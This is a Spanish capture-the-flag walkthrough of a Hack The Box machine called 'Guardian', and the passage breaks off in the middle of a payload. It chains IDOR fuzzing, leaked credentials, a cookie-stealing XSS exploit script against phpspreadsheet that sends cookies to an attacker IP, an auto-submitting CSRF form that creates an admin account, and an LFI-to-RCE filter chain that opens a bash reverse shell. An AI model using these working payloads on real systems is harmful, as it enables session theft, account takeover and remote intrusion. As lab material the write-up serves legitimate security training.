### 1. Enumeración inicial

Empezamos la máquina enumerando los puertos abiertos:

```bash
❯ sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.84 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 17:02 +0000
Initiating SYN Stealth Scan at 17:02
Scanning 10.10.11.84 [65535 ports]
Discovered open port 80/tcp on 10.10.11.84
Discovered open port 22/tcp on 10.10.11.84
Completed SYN Stealth Scan at 17:02, 15.59s elapsed (65535 total ports)
Nmap scan report for 10.10.11.84
Host is up, received user-set (0.076s latency).
Scanned at 2026-01-14 17:02:16 WET for 16s
Not shown: 65157 closed tcp ports (reset), 376 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
           Raw packets sent: 77558 (3.413MB) | Rcvd: 73904 (2.956MB)
```

Vemos que tiene un SSH y un servidor web abiertos. Añadimos el dominio `guardian.htb` al `/etc/hosts` y empezamos a enumerar el sitio web.

---
### 2. Enumeración web — Student Portal

Lo primero interesante que veo es un formulario de contacto aparentemente funcional:

![[1]](img/1.png)

También hay un **Student Portal**. Añadimos `portal.guardian.htb` al /etc/hosts y veamos que nos encontramos.

![[2]](img/2.png)

Podemos sacar mucha información relevante de este subdominio, si le damos a **Forgot Password**, la página http://portal.guardian.htb/forgot.php nos chiva lo simple que es el Student ID:

![[3]](img/3.png)

Se podría bruteforcear para dar con posibles usuarios, ya que el formato es GU seguido por 7 caracteres númericos, seguramente ese 2024 es el año de creación del UserID. El portal de ayuda (http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf) también nos da otra pista clave, la contraseña default de las cuentas es `GU1234`. 

No parece haber forma de enumerar usuarios válidos de primeras, el forgot password y el login tienen mensajes genéricos. Antes de tratar de hacer bruteforcing hay tres usuarios en la página principal que podemos probar:

![[4]](img/4.png)

El usuario `GU0142023` **usa las credenciales default**. Ganamos acceso a un panel de estudiantes:

![[5]](img/5.png)

Este panel tiene un montón de funcionalidades, toca ir fuzzeando cada cosa y probando diferentes opciones.

---
### 3. IDOR en la función de los chats

Los enlaces a los chats se ven así: http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=11

Esto huele a IDOR que nos permite ver chats de otras personas. Seguramente hay información relevante en dichos chats, vamos a crear un diccionario `numbers.txt` con un bucle:

```shell
seq 1 1000 > numbers.txt
```

Le metemos un escaneo con ffuf a ver los chats que nos va sacando, filtramos para que no nos aparezcan respuestas de chats inexistentes por tamaño de respuesta 5761:

```shell
❯ ffuf -u "http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ&chat_users[1]=FUZZ2" \
  -w numbers.txt:FUZZ \
  -w numbers.txt:FUZZ2 \
  -mode clusterbomb \
  -H "Cookie: PHPSESSID=a95tcg7jllbn4ebp5h14cfv6h1" \
  -t 50 \
  -p 0.3 \
  -timeout 10 \
  -mc 200 \
  -fs 5761

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ&chat_users[1]=FUZZ2
 :: Wordlist         : FUZZ: /home/abra/Documentos/Hacking/htb_machines/Guardian/numbers.txt
 :: Wordlist         : FUZZ2: /home/abra/Documentos/Hacking/htb_machines/Guardian/numbers.txt
 :: Header           : Cookie: PHPSESSID=a95tcg7jllbn4ebp5h14cfv6h1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Delay            : 0.30 seconds
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 5761
________________________________________________

[Status: 200, Size: 7306, Words: 3055, Lines: 185, Duration: 76ms]
    * FUZZ: 2
    * FUZZ2: 1

[Status: 200, Size: 6847, Words: 2770, Lines: 178, Duration: 377ms]
    * FUZZ: 3
    * FUZZ2: 2

[Status: 200, Size: 6847, Words: 2770, Lines: 178, Duration: 105ms]
    * FUZZ: 2
    * FUZZ2: 3

[Status: 200, Size: 6859, Words: 2772, Lines: 178, Duration: 76ms]
    * FUZZ: 3
    * FUZZ2: 4

[Status: 200, Size: 6853, Words: 2772, Lines: 178, Duration: 85ms]
    * FUZZ: 4
    * FUZZ2: 6

[Status: 200, Size: 6865, Words: 2773, Lines: 178, Duration: 94ms]
    * FUZZ: 10
    * FUZZ2: 8

[Status: 200, Size: 6865, Words: 2773, Lines: 178, Duration: 91ms]
    * FUZZ: 8
    * FUZZ2: 10

[Status: 200, Size: 6837, Words: 2769, Lines: 178, Duration: 74ms]
    * FUZZ: 14
    * FUZZ2: 12

[Status: 200, Size: 6854, Words: 2773, Lines: 178, Duration: 90ms]
    * FUZZ: 15
    * FUZZ2: 17

[Status: 200, Size: 6871, Words: 2773, Lines: 178, Duration: 76ms]
    * FUZZ: 19
    * FUZZ2: 21

[Status: 200, Size: 6841, Words: 2771, Lines: 178, Duration: 73ms]
    * FUZZ: 30
    * FUZZ2: 29

[Status: 200, Size: 6849, Words: 2770, Lines: 178, Duration: 73ms]
    * FUZZ: 31
    * FUZZ2: 32

[Status: 200, Size: 6826, Words: 2770, Lines: 178, Duration: 167ms]
    * FUZZ: 37
    * FUZZ2: 38

[WARN] Caught keyboard interrupt (Ctrl-C)
```

El chat que más nos interesa es: http://portal.guardian.htb/student/chat.php?chat_users[0]=2&chat_users[1]=1, contiene una contraseña para **Gitea**.

![[6]](img/6.png)

Tenemos las credenciales `jamil:DHsNnk3V503`. 

---
### 4. Acceso a Gitea y análisis del código fuente

Toca averiguar donde está alojado ese gitea, de primeras voy a probar a añadir `gitea.guardian.htb` al **/etc/hosts** y entrar al subdominio, esto **funciona**. Nos autenticamos y vemos que **tenemos acceso al código de `portal.guardian.htb` y al de `guardian.htb`**.

![[7]](img/7.png)

El de `guardian.htb` no tiene nada relevante, solo tiene un poco de código javascript para el formulario el cuál es seguro. Lo vulnerable va a estar en el `portal`, en el `composer.json` vemos esto:

```json
{
    "require": {
        "phpoffice/phpspreadsheet": "3.7.0",
        "phpoffice/phpword": "^1.3"
    }
}
```

**La versión 3.7.0 de phpspreasheet es vulnerable a XSS**. Al convertir un archivo XLSX a HTML, los nombres de las hojas no se sanean, permitiendo ejecutar código JavaScript. 
https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx

---
### 5. XSS en phpspreadsheet — Robo de sesión

En las tareas de los estudiantes **se permite la subida de archivos .xlsx al servidor**. 

Vamos a generar un payload rápidamente con la libería **openpyxl** de Python (**un requisito importante para que funcione el exploit es que hayan varias hojas en el .xlsx creadas**):

```python
import zipfile
import os
import tempfile
from openpyxl import Workbook
import re

def create_multi_sheet_exploit(output_file="final_payload.xlsx"):
    print("[1/4] Creando workbook con OpenPyXL...")
    
    # Crear workbook con nombres especificos que podamos encontrar
    wb = Workbook()
    
    # Hoja 1: Normal
    ws1 = wb.active
    ws1.title = "HOJA_NORMAL_1"
    ws1['A1'] = "Assignment Data"
    
    # Hoja 2: Esta sera la MALICIOSA
    ws2 = wb.create_sheet()
    ws2.title = "HOJA_A_CAMBIAR"
    ws2['A1'] = "Some content"
    
    # Hoja 3: Otra normal
    ws3 = wb.create_sheet()
    ws3.title = "HOJA_NORMAL_3"
    ws3['A1'] = "References"
    
    # Guardar
    temp_file = "temp_workbook.xlsx"
    wb.save(temp_file)
    print(f"[2/4] Workbook base guardado: {temp_file}")
    
    # PAYLOAD - version optimizada
    payload = '&quot;&gt;&lt;img src=x onerror=&quot;new Image().src=&#39;http://10.10.15.254:4444/?c=&#39;+document.cookie&quot;&gt;'
    
    print(f"[3/4] Editando XML con payload...")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Extraer
        with zipfile.ZipFile(temp_file, 'r') as zip_ref:
            zip_ref.extractall(tmpdir)
        
        # Ruta al XML
        xml_path = os.path.join(tmpdir, 'xl', 'workbook.xml')
        
        # Leer y mostrar contenido ANTES
        with open(xml_path, 'r', encoding='utf-8') as f:
            xml_content = f.read()
        
        print("\n[DEBUG] Buscando 'HOJA_A_CAMBIAR' en XML...")
        if 'HOJA_A_CAMBIAR' not in xml_content:
            print("[ERROR] No se encontro 'HOJA_A_CAMBIAR'")
            print("Contenido (fragmento):")
            print(xml_content[:500])
            return
        
        # Reemplazar EXACTAMENTE el nombre
        old_name = 'name="HOJA_A_CAMBIAR"'
        new_name = f'name="{payload}"'
        
        xml_content = xml_content.replace(old_name, new_name)
        
        # Guardar cambios
        with open(xml_path, 'w', encoding='utf-8') as f:
            f.write(xml_content)
        
        print(f"[4/4] Recomprimiendo como {output_file}...")
        
        # Comprimir en el orden correcto
        files_to_add = []
        for root, dirs, files in os.walk(tmpdir):
            for file in files:
                if file == '.DS_Store':
                    continue
                full_path = os.path.join(root, file)
                rel_path = os.path.relpath(full_path, tmpdir)
                files_to_add.append((full_path, rel_path))
        
        # Ordenar para consistencia
        files_to_add.sort(key=lambda x: x[1])
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for full_path, rel_path in files_to_add:
                zipf.write(full_path, rel_path)
    
    # Limpiar
    os.remove(temp_file)
    
    print(f"\n[LISTO] {output_file} creado exitosamente!")
    
    # VERIFICACION DETALLADA
    print("\n" + "="*60)
    print("VERIFICACION DE NOMBRES DE HOJA:")
    print("="*60)
    
    # Extraer y mostrar los nombres
    with zipfile.ZipFile(output_file, 'r') as zipf:
        with zipf.open('xl/workbook.xml') as xml_file:
            xml_verify = xml_file.read().decode('utf-8')
    
    # Encontrar todos los nombres
    sheet_names = re.findall(r'name="([^"]+)"', xml_verify)
    
    for i, name in enumerate(sheet_names, 1):
        print(f"Hoja {i}: {name}")
        if '&quot;&gt;' in name:
            print(f"   - CONTIENE PAYLOAD XSS")
            # Decodificar para ver
            decoded = (name.replace('&quot;', '"')
                          .replace('&gt;', '>')
                          .replace('&lt;', '<')
                          .replace('&#39;', "'"))
            print(f"   Decodificado: {decoded[:80]}...")
    
    print("\nArchivo final_payload.xlsx generado correctamente")

# Ejecutar
create_multi_sheet_exploit()
```

Lo ejecutamos:

```python
❯ python3 exploit.py
[1/4] Creando workbook con OpenPyXL...
[2/4] Workbook base guardado: temp_workbook.xlsx
[3/4] Editando XML con payload...

[DEBUG] Buscando 'HOJA_A_CAMBIAR' en XML...
[4/4] Recomprimiendo como final_payload.xlsx...

[LISTO] final_payload.xlsx creado exitosamente!

============================================================
VERIFICACION DE NOMBRES DE HOJA:
============================================================
Hoja 1: HOJA_NORMAL_1
Hoja 2: &quot;&gt;&lt;img src=x onerror=&quot;new Image().src=&#39;http://10.10.15.254:4444/?c=&#39;+document.cookie&quot;&gt;
   - CONTIENE PAYLOAD XSS
   Decodificado: "><img src=x onerror="new Image().src='http://10.10.15.254:4444/?c='+document.co...
Hoja 3: HOJA_NORMAL_3

Archivo final_payload.xlsx generado correctamente
❯ ls final_payload.xlsx
 final_payload.xlsx
```

Nos ponemos en escucha, subimos el archivo `final_payload.xlsx` generado, y **recibiremos las cookies de otro usuario**:

![[8]](img/8.png)

```shell
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.11.84 - - [14/Jan/2026 19:12:21] "GET /?c=PHPSESSID=58l3vkoog943hapm27e2pco11c HTTP/1.1" 200 -
```

Tenemos un **PHPSESSID** con valor `58l3vkoog943hapm27e2pco11c`. Se lo inyectamos al navegador en `http://portal.guardian.htb/` y recargamos la página. Veremos que pasamos de ser un **Student** a un **Lecturer**:

![[9]](img/9.png)

Estamos como el usuario `sammy.treat`. El dashboard tiene funcionalidades diferentes.

---
### 6. Escalada a Admin — CSRF

En **Notice Board** podemos crear un Notice, y nos pone que **será revisado por un administrador.** http://portal.guardian.htb/lecturer/notices/create.php

Probando un poco no hay XSS en dicha funcionalidad, lo que nos da la pista también es que podemos **poner un enlace para que lo pinche el administrador**, huele a **CSRF**, si revisamos el código fuente en el Gitea de las funciones que puede realizar el usuario administrador nos encontramos con esto: http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/admin/createuser.php

```php
<?php
require '../includes/auth.php';
require '../config/db.php';
require '../models/User.php';
require '../config/csrf-tokens.php';

$token = bin2hex(random_bytes(16));
add_token_to_pool($token);

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$config = require '../config/config.php';
$salt = $config['salt'];

$userModel = new User($pdo);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $csrf_token = $_POST['csrf_token'] ?? '';

    if (!is_valid_token($csrf_token)) {
        die("Invalid CSRF token!");
    }

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $full_name = $_POST['full_name'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $address = $_POST['address'] ?? '';
    $user_role = $_POST['user_role'] ?? '';

    // Check for empty fields
    if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) {
        $error = "All fields are required. Please fill in all fields.";
    } else {
        $password = hash('sha256', $password . $salt);

        $data = [
            'username' => $username,
            'password_hash' => $password,
            'full_name' => $full_name,
            'email' => $email,
            'dob' => $dob,
            'address' => $address,
            'user_role' => $user_role
        ];

        if ($userModel->create($data)) {
            header('Location: /admin/users.php?created=true');
            exit();
        } else {
            $error = "Failed to create user. Please try again.";
        }
    }
}
?>
```

Tenemos el código con el que se crea a los usuarios, también si chequeamos la lógica de los tokens en `csrf-tokens.php` (http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/config/csrf-tokens.php), nos encontramos con esto:

```php
<?php

$global_tokens_file = __DIR__ . '/tokens.json';

function get_token_pool()
{
    global $global_tokens_file;
    return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : [];
}

function add_token_to_pool($token)
{
    global $global_tokens_file;
    $tokens = get_token_pool();
    $tokens[] = $token;
    file_put_contents($global_tokens_file, json_encode($tokens));
}

function is_valid_token($token)
{
    $tokens = get_token_pool();
    return in_array($token, $tokens);
}
```

**No tiene expiración de tokens, ni revocación, ni verificación de origen.** Cualquiera que se haya usado anteriormente en la página servirá para montar un servidor web que al ser pinchado por el administrador **cree un usuario administrador nuevo en portal.guardian.htb**.

Obtendremos un csrf-token válido con solo ver el código fuente de la página: http://portal.guardian.htb/lecturer/notices/create.php.

![[10]](img/10.png)

Vamos a servir este `index.html`, con un formulario malicioso que envía por POST todos los datos necesarios para crear al usuario `hacker:Password123!` al endpoint `http://portal.guardian.htb/admin/createuser.php`, **con un javascript que se encarga de autosubmittear el formulario nada más se carga la página:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Guardian Notice</title>
</head>
<body>
    <h1>Important Notice</h1>
    <p>Please check this important update:</p>
    
    <form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
        <input type="hidden" name="csrf_token" value="13a01d552a39df679c56fbac81020531">
        <input type="hidden" name="username" value="hacker">
        <input type="hidden" name="password" value="Password123!">
        <input type="hidden" name="full_name" value="Hacker User">
        <input type="hidden" name="email" value="hacker@guardian.htb">
        <input type="hidden" name="dob" value="1990-01-01">
        <input type="hidden" name="address" value="Hacker Street">
        <input type="hidden" name="user_role" value="admin">
    </form>
    
    <script>
        // Auto-submit the form when the page loads
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('csrfForm').submit();
        });
    </script>
    
    <p>Loading administrator panel...</p>
</body>
</html>
```

Enviamos el enlace malicioso al admin a través del nuevo Notice y esperamos a recibir la petición:

![[11]](img/11.png)

```shell
❯ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.1.58 - - [15/Jan/2026 16:05:56] "GET /index.html HTTP/1.1" 200 -
```

Ahora nos podemos autenticar en http://portal.guardian.htb/login.php con las credenciales `hacker:Password123!`.

![[12]](img/12.png)

---
### 7. LFI → RCE

Como pasó antes ahora que tenemos privilegios diferentes, **tenemos funcionalidades diferentes.** Si accedemos al apartado **Reportes** y clickamos en uno, veremos como en la URL usa un parámetro `?report` para apuntar a un archivo de la máquina local.
http://portal.guardian.htb/admin/reports.php?report=reports/enrollment.php

Creo que acá es bastante clara la vulnerabilidad a explotar, tiene un **Local File Inclusion**.

![[13]](img/13.png)

Tiene un pequeño WAF que bloquea peticiones maliciosas, **o eso parece**. Si miramos como funciona el parámetro en el Gitea, veremos que se trata de una simple sanitización muy fácil de saltar: http://gitea.guardian.htb/Guardian/portal.guardian.htb/src/branch/main/admin/reports.php

```php
if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}
```

Bebemos evitar introducir `..` en la URL (filtra también URL-Encoded). También solo permite los archivos acabados en:

- `enrollment.php`

- `academic.php`

- `financial.php`

- `system.php`

Vamos a usar la herramienta `php_filter_chain_generator.py` (https://github.com/synacktiv/php_filter_chain_generator), para vulnerar este LFI. 

Vamos a generar una cadena con un montón de filtros y wrappers de php, a ver si alguno cuela para ejecutar un `<?php phpinfo(); ?>`:

```shell
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'

[+] The following gadget chain will generate the following code : <?php phpinfo(); ?> (base64 value: PD9waHAgcGhwaW5mbygpOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Pillamos este payload y al final del todo le vamos a añadir un `/system.php` para saltarnos la validación del archivo permitido, el payload final (copiar y pegar en la URL simplemente), va a ser:

```url
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp/system.php
```

![[14]](img/14.png)

Vemos que funcionó, ahora este LFI toca derivarlo a un **RCE**. Tan fácil como ejecutar:

```shell
python3 php_filter_chain_generator.py --chain '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.61/4444 0>&1\""); ?>'
```

Cambiamos la IP y el puerto por la de nuestra máquina de atacante, modificaremos el payload que nos suelta la herramienta añadiendo al final un `/system.php`, nuestra URL se queda así:

```url
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.U